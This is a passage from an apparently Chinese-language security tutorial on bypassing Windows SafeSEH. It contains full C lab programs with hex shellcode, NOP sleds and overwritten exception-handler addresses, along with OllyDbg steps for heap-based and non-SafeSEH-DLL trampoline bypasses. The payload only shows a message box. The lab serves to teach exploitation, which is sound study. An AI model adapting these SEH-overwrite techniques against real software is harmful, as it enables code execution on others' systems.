shellcode 布置到堆区就可以直接跳转执行！</p><blockquote><p>请注意本节所有关于绕过 SafeSEH 机制的讨论均不考虑 DEP 的影响</p></blockquote><h1 id="攻击返回地址绕过-safeseh"><a class="markdownIt-Anchor" href="#攻击返回地址绕过-safeseh"></a> 攻击返回地址绕过 SafeSEH</h1><p>如果碰到一个程序，他启用了 SafeSEH 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者肯定会直接攻击函数返回地址。实验请看《栈中的守护天使：GS》，这里不再重复介绍了。</p><h1 id="利用虚函数绕过-safeseh"><a class="markdownIt-Anchor" href="#利用虚函数绕过-safeseh"></a> 利用虚函数绕过 SafeSEH</h1><p>利用思路和我们在《栈中的守护天使：GS》中介绍的类似，通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理， SafeSEH 也就只是个摆设。在这我们就不做过多介绍了。</p><h1 id="从堆中绕过-safeseh"><a class="markdownIt-Anchor" href="#从堆中绕过-safeseh"></a> 从堆中绕过 SafeSEH</h1><p>演示如何利用堆绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xF8\x3D\x39\x00&quot;</span><span class="comment">//address of shellcode in heap</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//char shellcode[]=</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * buf=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,shellcode);</span><br><span class="line">    test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1）首先在堆中申请 500 字节的空间，用来存放 shellcode。<br>（ 2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）用 shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理，进而跳转到堆中的 shellcode 执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th><th></th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00393DF8 为 shellcode 在堆中的起始地址，该地址可能在实验过程中需要重新设置。</p></blockquote><p>首先将 shellcode 填充为多个 0x90，然后将程序用 VS2008 编译好后运行，由于我们再程序中加入了 int 3 指令，程序会自动中断，我们选择调试后系统会调用默认调试器进行调试，程序会自动停在 __asm int 3 处 。</p><p>如下图，程序中断前刚刚完成堆中空间申请，此时寄存器 EAX 中存放着申请空间的首地址 0x00393DF8，这个地址在不同机器上会有所不同。有了 shellcode的首地址，我们还需要确定shellcode需要填充多少字节才能淹没异常函数的地址。继续运行程序，中断在 test 函数中字符串复制结束时。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605193524256.png" alt="image-20220605193524256"></p><p>如下图所示，被溢出的字符串起始地址为 0x0012FE8C，S.E.H 异常处理函数指针位于 0x0012FFB0+4 的位置。所以我们使用 300 个字节就能覆盖掉异常处理函数指针。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194838798.png" alt="image-20220605194838798"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194942893.png" alt="image-20220605194942893"></p><p>布置 shellcode：</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605195648181.png" alt="image-20220605195648181"></p><p>验证我们的分析是否正确。程序依然会被 INT 3 中断，等OllyDbg运行后 按Ctrl+G 跳转到 0x00393DF8 设置断点，然后按F9继续运行，可以看到程序在 0x00393DF8 处中断，说明我们已经成功绕过SafeSEH 转入 shellcode 执行。继续执行就会看到 failwest 对话框了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605200429987.png" alt="image-20220605200429987"></p><h1 id="利用未启用-safeseh-模块绕过-safeseh"><a class="markdownIt-Anchor" href="#利用未启用-safeseh-模块绕过-safeseh"></a> 利用未启用 SafeSEH 模块绕过 SafeSEH</h1><p>SafeSEH 对于未启用 SafeSEH 模块中的异常处理的校验过程：如果模块未启用 SafeSEH，并且该模块包含除中间语言（IL）之外的其它语言，这个异常处理就可以被执行。所以我们可以利用未启用 SafeSEH 的模块中的指令作为跳板来绕过 SafeSEH。</p><p>实验思路：构造一个不启用 SafeSEH 的 dll，然后将其加载，并通过它里面的指令作为跳板实现 SafeSEH 的绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    pop eax</span><br><span class="line">    pop eax</span><br><span class="line">    retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）用 VC++ 6 .0 编译一个不使用 SafeSEH 的动态链接库 SEH_NOSafeSEH_JUMP.DLL，然后由启用 SafeSEH 的应用程序 SEH_NOSafeSEH.EXE 去加载它。<br>（ 2）SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）使用 SEH_NOSafeSEH_JUMP.DLL 中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，让程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：将 dll 基址设置为 0x11120000 是为了防止“ pop pop retn”指令地址中存在 0x00。<br>如果以 VC++ 6.0 的默认加载基址 0x10000000 为 DLL 的加载基址，DLL 中的 “pop pop retn” 指令地址可能会包含 0x00，这会导致我们在进行 strcpy 操作时会将字符串截断影响 shellcode 的复制。</p></blockquote><p>注意：记得禁用优化选项，Project --&gt; Properties --&gt; Configuration Properties --&gt; C/C++ --&gt; Optimization --&gt;  Optimization 选择 Disabled</p><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h2><p>（ 1）编译一个不启用 SafeSEH 的 DLL</p><ol><li>在VC++ 6.0 中建立一个 Win32 的动态链接库，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606150709169.png" alt="image-20220606150709169"></p><ol start="2"><li>重新设置基址，在顶部菜单中选择 “工程 —&gt; 设置”，然后切换到 ”连接“ 选项卡，在 “工程选项“ 的输入框中添加 ” /base:“0x11120000” “即可，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606151129127.png" alt="image-20220606151129127"></p><ol start="3"><li>编译好后，将 SEH_NOSafeSEH_JUMP.DLL 复制到与 SEH_NOSafeSEH.EXE 相同目录下。</li></ol><p>（ 2）分析要溢出的主程序</p><ol><li>添加 INT 3中断，然后通过 OllySSEH 插件查看加载模块的 SafeSEH 情况。</li></ol><blockquote><p>插件下载地址：(<a href="https://bbs.pediy.com/thread-45544.htm">https://bbs.pediy.com/thread-45544.htm</a>)<br>OllySSEH 对于 SafeSEH 的描述：<br>（1） /SafeSEH OFF，未启用 SafeSEH，这种模块可以作为跳板。</p><p>（2） /SafeSEH ON，启用 SafeSEH，可以使用右键点击查看 S.E.H 注册情况。</p><p>（3） No SEH，不支持 SafeSEH，即 IMAGE_DLLCHARACTERISTICS_ NO_SEH 标志位被设置，模块内的异常会被忽略，所以不能作为跳板。</p><p>（4） Error，读取错误</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171712911.png" alt="image-20220606171712911"></p><p>查看结果，如下图所示。主程序 SEH_NOSafeSEH.EXE 中启用了 SafeSEH，但是它里面的模块SEH_NOSafeSEH_JUMP.DLL 未启用 SafeSEH，我们可以利用这个 DLL 中的 ”pop pop retn“ 指令作为跳板来绕过 SafeSEH。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171616216.png" alt="image-20220606171616216"></p><p>（ 3）确定跳板地址</p><p>转到 0x11120000 中右击，查找 --&gt; 命令序列<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606172452434.png" alt="image-20220606172452434"></p><p>在命令序列框中输入下图命令，查找它</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211412069.png" alt="image-20220608211412069"></p><p>然后我们就找到了在DLL中的 “pop eax pop eax retn”，位于 0x11121068 处，如下图<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211446531.png" alt="image-20220608211446531"></p><p>（ 4）构造 shellcode</p><ol><li>计算被溢出字符串到最近的异常处理函数指针的距离。<br>先将 shellcode 赋值为 0x90 串，长度小于 200 个字节，然后再 strcpy 操作结束后中断程序。<br>如下图，被溢出字符串起始位置为 0x0012FDB8</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608210733817.png" alt="image-20220608210733817"></p><p>​距离它最近的异常处理函数指针位于 0x0012FE90+4 位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608212431019.png" alt="image-20220608212431019"></p><p>由于这次使用的是 “pop pop retn” 指令序列，所以我们要将弹出 “failwest” 对话框的机器码放到 shellcode 的后半部分。（避免未命中）</p><blockquote><p>注意：经过 VS 2008 编译的程序，在进入含有__try{}的函数时会在 Security Cookie+4 的位置压入-2（ VC++ 6.0 下为-1），在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。</p><p>例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成 0，进入第二个的时候被修改为 1。如果在__try{}块中<strong>出现了异常，程序会根据这个值调用相应的__except()处理</strong>，处理结束后这个位置的值会重新修改为-2；如里没有发生异常，程序在离开__try{}块时这个值也会被修改回-2。当然这个值在异常处理时还有其他用途，在这我们不过多介绍，有兴趣的话可以自己跟踪调试一下。我们只需要知道<strong>由于它的存在，我们的 shellcode 可能会被破坏。</strong></p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608214503431.png" alt="image-20220608214503431"></p><p>为了避免shellcode 关键部分被破坏，我们采用一下布局：shellcode 最开始部分为 220 个字节的 0x90 填充；在 221~224 位置用跳板地址 0x11121068 覆盖；然后再跟上 8 个字节的 0x90 填充；最后附上弹出 “ failwest” 对话框的机器码。这样就可以保证弹出对话框的机器码不被破坏了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608220337220.png" alt="image-20220608220337220"></p><blockquote><p>题外话： 在实际的溢出过程中由于条件限制和未知因素， shellcode 有时会被破坏，出现这种情况时可以尝试不同的 shellcode 布局，使用不同的跳转指令，以避开这些破坏。</p></blockquote><p>（ 5）调试运行</p><ol><li>将上面的 shellcode 布置好后，编译运行程序，用 OllyDbg 调试程序，在 0x11121068 处下断点，让程序继续运行。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609143555512.png" alt="image-20220609143555512"></p><ol start="2"><li>我们将会看到，程序停在 0x11121068 处，说明我们已经进入DLL 绕过 SafeSEH，成功劫持程序流程了，如下图。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144122991.png" alt="image-20220609144122991"></p><ol start="3"><li>继续单步执行，我们将会看到从 0x0012FE90 到 0x0012FEA0 中有一些未知命令，分别是我们用来覆盖异常函数指针的跳板地址和进入__try{}块时被赋值为 0 的部分。本实验中它们对实验结果没有影响，如果有影响，就要用向后跳转指令，跳过影响指令，直接进入关键部分。</li></ol><blockquote><p>可以尝试将 shellcode 中的 217~220 字节用 0xEB0E9090 填充，执行后，他会跳过 shellcode 中间部分，直接运行到弹出对话框部分。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144659336.png" alt="image-20220609144659336"></p><ol start="4"><li>按F9继续执行，就能看到对话框了。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609151230429.png" alt="image-20220609151230429"></p><h1 id="利用加载模块之外的地址绕过-safeseh"><a class="markdownIt-Anchor" href="#利用加载模块之外的地址绕过-safeseh"></a> 利用加载模块之外的地址绕过 SafeSEH</h1><p>在前面我们讲过，SafeSEH 只检查异常处理函数指针是否指向栈中地址，对于指向其它地址它是不对其进行有效性验证的。所以我们可以让异常处理函数指针指向非栈地址，进而就能绕过 SafeSEH 检验。</p><p>然而当程序加载到内存中后，在它所占的整个内存空间中，除了我们平时常见的 PE 文件模块（ EXE 和 DLL）外，还有其他一些映射文件（我们可以通过 